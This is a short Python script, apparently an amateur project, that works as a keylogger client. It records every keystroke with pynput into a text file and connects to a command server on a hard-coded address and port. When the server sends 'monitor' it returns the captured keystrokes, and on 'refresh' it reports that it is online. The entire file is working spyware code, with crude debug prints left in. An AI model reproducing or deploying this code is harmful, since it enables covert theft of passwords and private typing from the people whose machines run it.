import socket
import os
import threading

from pynput import keyboard

file_location = os.getcwd()
file_is_open = False
text_file_name = file_location + "\\textfile.txt"
flag = False

def on_press(key):
    global file_is_open
    try:
        k = key.char
    except:
        k = ""
    print('Key pressed: ' + k)
    with open("textfile.txt", "a+") as file:
        file.write(k)

def listen_keyboard():
    print("shit")
    listener = keyboard.Listener(on_press=on_press)
    print("shit2")
    listener.start()
    listener.join()

while True:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("127.0.0.1", 62121))
            break
        except:
            print("Trying to connect...")
    while True:
        if flag == False:
            threading.Thread(target=listen_keyboard).start()
            flag = True
        try:
            data = (s.recv(1024)).decode("utf-8")
            if data == "monitor":
                with open("textfile.txt", "r") as read_file:
                    file_data = read_file.read()
                    s.sendall(file_data.encode("utf-8"))
            elif data == "refresh":
                try:
                    s.sendall("Online".encode("utf-8"))
                except:
                    print("[FAILED] Could not send client status to server")
        except:
            break
